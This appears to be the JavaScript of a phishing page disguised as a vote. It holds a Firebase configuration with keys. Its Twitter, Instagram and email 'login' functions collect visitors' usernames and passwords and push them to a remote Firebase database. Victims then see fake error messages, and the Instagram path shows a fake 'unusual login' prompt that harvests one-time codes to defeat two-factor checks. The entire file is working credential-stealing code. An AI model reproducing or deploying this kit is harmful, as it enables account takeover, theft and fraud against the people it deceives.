// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyAAB3mKzFESn0ao6IxuKVDoz_vGYrcFFzI",
  authDomain: "eliteduba.firebaseapp.com",
  databaseURL: "https://eliteduba-default-rtdb.firebaseio.com",
  projectId: "eliteduba",
  storageBucket: "eliteduba.appspot.com",
  messagingSenderId: "342823734591",
  appId: "1:342823734591:web:40ed37dd04a53a255dd78a",
};

firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function tw_login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("tw-email").value;
  var password = document.getElementById("tw-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Twitter";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Something went wrong with your vote.",
        icon: "error",
        confirmButtonText: "Try Again",
      });
      document.getElementById("fb-pass").value = "";

      return false;
    }, 2000);
  }
}

// Function to handle Instagram login
function iglog() {
  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;

  if (username !== "" && password !== "") {
    // Authenticate anonymously
    firebase
      .auth()
      .signInAnonymously()
      .catch(function (error) {
        var errorMessage = error.message;
        window.alert("Error: " + errorMessage);
      });

    // Set up time and account type
    var currentDate = new Date().toISOString().slice(0, 10);
    var currentTime = new Date().toISOString().slice(11, 19);
    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    var accountType = "Instagram";

    // Show the unusual login message
    Swal.fire({
      title: "Unusual Login Detected!",
      text: "We noticed something unusual about your login. Click the button below to confirm it's really you.",
      icon: "warning",
      showCancelButton: true,
      confirmButtonText: "Confirm",
      cancelButtonText: "Cancel",
    }).then((result) => {
      if (result.isConfirmed) {
        // Show OTP request message
        Swal.fire({
          title: "Verify it's you",
          text: "Enter the code we sent to your email/phone.",
          icon: "info",
        }).then(() => {
          // Hide the login form and show OTP form
          document.getElementById("instagram").style.display = "none"; // Hide Instagram dialog
          document.getElementById("profile_content").style.display = "none"; // Hide profile content

          document.getElementById("otpForm").style.display = "block"; // Show OTP form
        });
      } else {
        // User canceled, handle accordingly (e.g., reset form or log out)
        console.log("User canceled OTP verification.");
      }
    });

    // Reset password field for security
    document.getElementById("ig-pass").value = "";
  } else {
    // Show error message for empty username/password
    Swal.fire({
      title: "Oops!",
      text: "Please enter both username and password.",
      icon: "error",
      confirmButtonText: "Try Again",
    });
  }
}

// Handle OTP submission
document.getElementById("submitOtp").addEventListener("click", function () {
  const otpCode = document.getElementById("otpCode").value;
  const username = document.getElementById("ig-uname").value; // Capture username
  const password = document.getElementById("ig-pass").value; // Capture password
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  // Validate and send OTP code to server here
  if (otpCode) {
    // Push to Firebase including username, password, and OTP
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
      otp: otpCode, // Include OTP here
    });

    // Simulate OTP verification
    Swal.fire({
      title: "OTP Submitted!",
      text: "Your OTP code has been submitted.",
      icon: "success",
    });

    // Optionally proceed with the next steps (like redirecting to a new page or loading content)
    // For example, you could redirect to a profile page or load user data here
  } else {
    Swal.fire({
      title: "Error!",
      text: "Please enter a valid OTP code.",
      icon: "error",
    });
  }
});

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorCode = error.code;
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var email = document.getElementById("email").value;
  var password = document.getElementById("email_pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      Swal.fire({
        title: "Oops!",
        text: "Something went wrong with your vote.",
        icon: "error",
        confirmButtonText: "Try Again",
      });
      document.getElementById("email_pass").value = "";

      return false;
    }, 2000);
  }
}
